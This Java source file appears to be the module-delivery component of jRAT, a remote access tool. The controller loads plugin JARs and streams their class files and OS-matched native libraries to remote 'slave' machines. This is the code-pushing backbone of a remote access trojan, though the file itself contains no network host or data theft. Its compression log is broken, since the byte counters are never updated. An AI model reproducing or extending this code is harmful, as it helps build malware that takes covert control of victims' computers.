package jrat.controller.modules;

import jrat.api.ControllerModule;
import jrat.common.Logger;
import jrat.controller.AbstractSlave;
import oslib.OperatingSystem;

import java.io.File;
import java.util.Map;

public final class Module {

    private String name;

    private LocalModule<ControllerModule> controller;
    private PackedModule client;


    public Module(String name) {
        this.name = name;
    }

    private File getControllerFile() {
        return new File("modules", this.name + "-controller.jar");
    }

    private File getClientFile() {
        return new File("modules", this.name + "-client.jar");
    }

    /**
     * Load the controller module if it exists,
     * and prepare the client module if it exists
     *
     * @throws Exception
     */
    public void load() throws Exception {
        File controllerFile = getControllerFile();
        if (controllerFile.exists()) {
            this.controller = new LocalModule<>(controllerFile);
            this.controller.load();
            this.controller.getInstance().init();
        }

        File clientFile = getClientFile();
        if (clientFile.exists()) {
            this.client = new PackedModule(clientFile);
            this.client.load();
        }
    }

    /**
     * Write this module to the client
     * @param slave
     * @throws Exception
     */
    public void write(AbstractSlave slave) throws Exception {
        int total = 0;
        int totalUncompressed = 0;

        slave.writeLine(client.getMainClass());

        Map<String, byte[]> resources = client.getPackedResources();

        for (String name : resources.keySet()) {
            // skip native libraries incompatible with platform
            int index = name.lastIndexOf(".");
            String extension = index == -1 ? "" : name.substring(name.lastIndexOf("."));

            switch (extension) {
                case ".dylib":
                    if (slave.getOperatingSystem().getType() != OperatingSystem.MACOS) {
                        continue;
                    }
                    break;
                case ".dll":
                    if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
                        continue;
                    }
                    break;
                case ".so":
                    if (!slave.getOperatingSystem().isUnix()) {
                        continue;
                    }
                    break;
            }

            byte[] data = resources.get(name);

            slave.writeBoolean(true);
            slave.writeBoolean(name.endsWith(".class"));
            slave.writeLine(name);
            slave.writeInt(data.length);
            slave.write(data);
        }

        // indicate that there are no entries left for this module
        slave.writeBoolean(false);
        Logger.log("\ttotal: " + total + " bytes (" + (((float) total / (float) totalUncompressed) * 100f) + "%)");

        slave.loadedModules.add(controller.getInstance());
    }
}
